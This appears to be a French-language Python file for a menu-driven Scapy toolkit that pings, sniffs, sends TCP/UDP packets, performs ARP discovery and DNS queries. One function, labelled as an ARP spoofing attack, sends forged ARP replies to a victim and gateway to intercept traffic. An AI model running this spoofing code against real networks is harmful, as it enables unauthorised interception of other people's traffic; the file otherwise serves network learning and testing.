import scapy.all as scapy


def send_custom_ping():
    try:
        print("[*] Envoi d'un ping ICMP personnalisé...")
        target_ip = input("Entrez l'adresse IP cible pour envoyer le ping: ")
        payload = input("Entrez le message à envoyer dans le champ 'data' du paquet ICMP : ")
        packet = scapy.IP(dst=target_ip) / scapy.ICMP() / scapy.Raw(load=payload)
        response = scapy.sr1(packet, timeout=2, verbose=False)
        if response:
            print(f"[*] Réponse reçue de {target_ip} : {response.summary()}")
        else:
            print(f"[!] Pas de réponse reçue de {target_ip}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de l'envoi du ping : {str(e)}")


def sniff_packets():
    try:
        print("[*] Démarrage de la capture de paquets...")
        packets = scapy.sniff(count=10, timeout=10)
        print(f"[*] Paquets capturés : {len(packets)}")
        for packet in packets:
            print(f"[*] Paquet : {packet.summary()}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de la capture des paquets : {str(e)}")


def send_tcp_packet():
    try:
        print("[*] Envoi d'un paquet TCP avec différents flags...")
        target_ip = input("Entrez l'adresse IP cible pour envoyer le paquet TCP: ")
        target_port = int(input("Entrez le port cible : "))
        flags = input(
            "Entrez les flags TCP à utiliser (par exemple, 'S' pour SYN, 'A' pour ACK, 'F' pour FIN, etc.) : ")
        packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=target_port, flags=flags)
        response = scapy.sr1(packet, timeout=2, verbose=False)
        if response:
            print(f"[*] Réponse TCP reçue : {response.summary()}")
        else:
            print(f"[!] Pas de réponse TCP reçue de {target_ip}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de l'envoi du paquet TCP : {str(e)}")


def arp_spoofing():
    try:
        print("[*] Effectuer une découverte ARP...")
        target_ip = input("Entrez l'adresse IP de la cible à scanner : ")
        packet = scapy.ARP(pdst=target_ip)
        response = scapy.srp(packet, timeout=2, verbose=False)[0]
        for sent, received in response:
            print(f"[*] Adresse IP : {received.psrc} - Adresse MAC : {received.hwsrc}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de la découverte ARP : {str(e)}")


def arp_spoof():
    try:
        print("[*] Lancer une attaque ARP Spoofing...")
        target_ip = input("Entrez l'adresse IP de la victime : ")
        gateway_ip = input("Entrez l'adresse IP de la passerelle : ")

        print(f"[*] Spoofing ARP sur {target_ip} et {gateway_ip}")

        packet_victime = scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:11:22:33:44:55")
        scapy.send(packet_victime, verbose=False)

        packet_gateway = scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc="00:11:22:33:44:55")
        scapy.send(packet_gateway, verbose=False)
        print("[*] ARP Spoofing effectué!")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de l'ARP Spoofing : {str(e)}")


def dns_query():
    try:
        print("[*] Analyse des requêtes DNS...")
        target_domain = input("Entrez le nom de domaine à analyser (par exemple google.com) : ")
        dns_packet = scapy.IP(dst="8.8.8.8") / scapy.UDP(dport=53) / scapy.DNS(rd=1,
                                                                               qd=scapy.DNSQR(qname=target_domain))
        response = scapy.sr1(dns_packet, timeout=2, verbose=False)
        if response:
            print(f"[*] Réponse DNS : {response[scapy.DNS].summary()}")
        else:
            print("[!] Pas de réponse DNS reçue.")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de l'analyse DNS : {str(e)}")



def send_udp_packet():
    try:
        print("[*] Envoi d'un paquet UDP...")
        target_ip = input("Entrez l'adresse IP cible pour envoyer le paquet UDP: ")
        target_port = int(input("Entrez le port cible : "))
        packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=target_port) / scapy.Raw(load="Test UDP payload")
        response = scapy.sr1(packet, timeout=2, verbose=False)
        if response:
            print(f"[*] Réponse UDP reçue : {response.summary()}")
        else:
            print(f"[!] Pas de réponse UDP reçue de {target_ip}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de l'envoi du paquet UDP : {str(e)}")


def filter_packets():
    try:
        print("[*] Filtrage des paquets avec un filtre personnalisé...")
        filter_expression = input("Entrez l'expression de filtre (par exemple 'ip src 192.168.1.1') : ")
        packets = scapy.sniff(filter=filter_expression, count=10, timeout=10)
        print(f"[*] Paquets capturés : {len(packets)}")
        for packet in packets:
            print(f"[*] Paquet filtré : {packet.summary()}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors du filtrage des paquets : {str(e)}")


def capture_tcp_stream():
    try:
        print("[*] Capture des flux TCP...")
        packets = scapy.sniff(filter="tcp", count=10, timeout=10)
        print(f"[*] Flux TCP capturés : {len(packets)}")
        for packet in packets:
            if packet.haslayer(scapy.TCP):
                print(
                    f"[*] Paquet TCP capturé : {packet[scapy.IP].src} -> {packet[scapy.IP].dst} : {packet[scapy.TCP].dport}")
    except Exception as e:
        print(f"[!] Une erreur est survenue lors de la capture du flux TCP : {str(e)}")


def explanation():
    print("""
    [*] Outil interactif utilisant Scapy - Explication des fonctionnalités

    1. **Envoyer un ping ICMP personnalisé** :
       - Permet d'envoyer un paquet ICMP avec un message personnalisé dans le champ 'data'. C'est une manière de tester la connectivité avec une cible et d'envoyer des informations supplémentaires dans le paquet.

    2. **Sniffer des paquets sur le réseau** :
       - Capture des paquets réseau (Ethernet, IP, TCP, etc.) pendant un certain temps et affiche un résumé de chaque paquet capturé.

    3. **Envoyer un paquet TCP avec différents flags** :
       - Permet d'envoyer des paquets TCP avec des flags spécifiques (par exemple, SYN, ACK, FIN) pour tester la connectivité ou pour mener des tests réseau comme des scans de ports.

    4. **Effectuer une découverte ARP** :
       - Envoie une requête ARP pour découvrir les adresses MAC des machines sur un réseau local à partir de leur adresse IP.

    5. **Lancer une attaque ARP Spoofing** :
       - Envoie des paquets ARP manipulés pour usurper l'adresse MAC de la passerelle et intercepter le trafic d'une victime sur le réseau local.

    6. **Analyse des requêtes DNS** :
       - Envoie une requête DNS à un serveur DNS public (Google DNS) pour résoudre un nom de domaine et obtenir l'adresse IP associée.

    7. **Envoyer un paquet UDP** :
       - Permet d'envoyer des paquets UDP à une adresse IP et à un port spécifique, ce qui est utile pour tester les services qui fonctionnent sur des ports UDP.

    8. **Filtrage des paquets avec un filtre personnalisé** :
       - Permet de capturer uniquement les paquets correspondant à un filtre précis, tel que les paquets provenant d'une adresse IP spécifique.

    9. **Capture des flux TCP** :
       - Capture et affiche les flux TCP d'un réseau, ce qui permet de surveiller les connexions réseau en temps réel.

    [*] Sélectionnez une option dans le menu interactif pour effectuer l'une des actions ci-dessus.
    """)


def interactive_tool_scapy():
    while True:
        print("\n[1] Envoyer un ping ICMP personnalisé")
        print("[2] Sniffer des paquets sur le réseau")
        print("[3] Envoyer un paquet TCP avec différents flags")
        print("[4] Effectuer une découverte ARP")
        print("[5] Lancer une attaque ARP Spoofing")
        print("[6] Analyser une requête DNS")
        print("[7] Envoyer un paquet UDP")
        print("[8] Filtrer des paquets avec un filtre personnalisé")
        print("[9] Capturer des flux TCP")
        print("[10] Explication des fonctionnalités")
        print("[11] Quitter")

        choice = input("\nEntrez votre choix (1-11): ")

        if choice == "1":
            send_custom_ping()
        elif choice == "2":
            sniff_packets()
        elif choice == "3":
            send_tcp_packet()
        elif choice == "4":
            arp_spoofing()
        elif choice == "5":
            arp_spoof()
        elif choice == "6":
            dns_query()
        elif choice == "7":
            send_udp_packet()
        elif choice == "8":
            filter_packets()
        elif choice == "9":
            capture_tcp_stream()
        elif choice == "10":
            explanation()
        elif choice == "11":
            print("[*] Merci d'avoir utilisé l'outil. Au revoir!")
            ma_fonction()
        else:
            print("[!] Choix invalide. Veuillez entrer un numéro entre 1 et 11.")

def ma_fonction():
    from tool.main import menu_princi
    menu_princi()
